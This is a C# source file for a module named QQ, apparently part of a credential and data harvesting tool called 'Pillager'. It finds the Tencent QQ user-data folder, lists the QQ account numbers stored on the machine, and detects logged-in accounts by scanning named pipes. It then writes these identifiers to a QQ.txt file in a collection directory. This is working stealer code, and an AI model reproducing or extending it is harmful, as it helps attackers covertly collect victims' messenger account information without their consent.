using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Pillager.Helper;

namespace Pillager.Messengers
{
    internal class QQ : ICommand
    {
        public string GetCommonDocumentsFolder()
        {
            int SIDL_COMMON_DOCUMENTS = 0x002e;
            StringBuilder sb = new StringBuilder();
            Native.SHGetFolderPath(IntPtr.Zero, SIDL_COMMON_DOCUMENTS, IntPtr.Zero, 0x0000, sb);
            return sb.ToString();
        }

        public string get_qq()
        {
            List<string> all = new List<string>();
            List<string> online = new List<string>();
            string inifile = Path.Combine(GetCommonDocumentsFolder(), "Tencent\\QQ\\UserDataInfo.ini");
            if (File.Exists(inifile))
            {
                try
                {
                    Pixini pixini = Pixini.Load(inifile);
                    string type = pixini.Get("UserDataSavePathType", "UserDataSet", "1");
                    string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "Tencent Files");
                    if (type == "2")
                    {
                        folder = pixini.Get("UserDataSavePath", "UserDataSet", "");
                    }
                    foreach (string s in Directory.GetDirectories(folder))
                    {
                        string name = Path.GetFileName(s);
                        if (!name.Contains("All Users")) all.Add(name);
                    }
                }
                catch { }
            }
            foreach (var qq in Directory.GetFiles(@"\\.\Pipe\"))
            {
                if (qq.Contains(@"\\.\Pipe\QQ_") && qq.Contains("_pipe")) online.Add(qq.Replace(@"\\.\Pipe\QQ_", "").Replace("_pipe", ""));
            }
            StringBuilder sb = new StringBuilder();
            if (all.Count > 0)
            {
                sb.AppendLine("All QQ number:");
                sb.AppendLine(string.Join(" ", all.ToArray()));
            }
            if (online.Count > 0)
            {
                sb.AppendLine("Online QQ number:");
                sb.AppendLine(string.Join(" ", online.ToArray()));
            }
            return sb.ToString();
        }

        public override void Save(string path)
        {
            try
            {
                string result = get_qq();
                if (string.IsNullOrEmpty(result)) return;
                string savepath = Path.Combine(path, "QQ");
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, "QQ.txt"), result, Encoding.UTF8);
            }
            catch { }
        }
    }
}
